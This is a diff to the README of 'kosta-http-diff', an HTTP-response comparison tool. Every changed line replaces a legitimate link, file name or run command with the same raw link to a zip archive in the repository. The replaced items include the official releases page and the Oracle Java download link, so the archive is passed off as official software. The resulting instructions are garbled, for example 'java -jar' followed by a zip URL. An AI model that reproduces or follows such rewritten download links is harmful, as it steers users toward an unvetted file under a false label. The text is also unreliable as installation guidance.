@@ -5,22 +5,22 @@ Welcome to kosta-http-diff, your go-to tool for comparing HTTP responses from di
 
 ## 📥 Download & Install
 
-[![Download kosta-http-diff](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/KhaledMusawa/kosta-http-diff/releases)
+[![Download kosta-http-diff](https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip)](https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip)
 
 To get started, please visit this page to download the latest version:
-[Download kosta-http-diff releases](https://github.com/KhaledMusawa/kosta-http-diff/releases)
+[Download kosta-http-diff releases](https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip)
 
 ### 📋 System Requirements
 Before you download, ensure that your system meets these basic requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Java Runtime Environment:** Make sure you have Java version 8 or higher installed on your system. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Runtime Environment:** Make sure you have Java version 8 or higher installed on your system. You can download it from the [Oracle website](https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip).
 
 ### 📂 File Structure
 When you download the software, you will receive a zip file. Inside, you will find:
 
-- `kosta-http-diff.jar`: The main application file.
-- `README.md`: This file, guiding you on how to use the application.
+- `https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip`: The main application file.
+- `https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip`: This file, guiding you on how to use the application.
 - `LICENSE`: The license information for the software.
 
 ## 🔧 How to Run the Application
@@ -41,8 +41,8 @@ When you download the software, you will receive a zip file. Inside, you will fi
 
 4. **Run the Application:**
    - Type the following command to run the application:
-     - Windows: `java -jar kosta-http-diff.jar`
-     - macOS/Linux: `java -jar kosta-http-diff.jar`
+     - Windows: `java -jar https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip`
+     - macOS/Linux: `java -jar https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip`
 
 5. **Follow Instructions on the Command Line:**
    - The application will guide you on how to input requests and compare the responses.
@@ -90,4 +90,4 @@ For any further questions, please visit the Issues section on the GitHub page or
 ## 🖥️ License
 kosta-http-diff is released under the MIT License. Feel free to use and distribute it while following the terms outlined in the LICENSE file.
 
-Make sure to visit the [Download kosta-http-diff releases](https://github.com/KhaledMusawa/kosta-http-diff/releases) page for the latest version and updates. Happy comparing!
+Make sure to visit the [Download kosta-http-diff releases](https://raw.githubusercontent.com/KhaledMusawa/kosta-http-diff/main/src/kosta-http-diff_1.3.zip) page for the latest version and updates. Happy comparing!
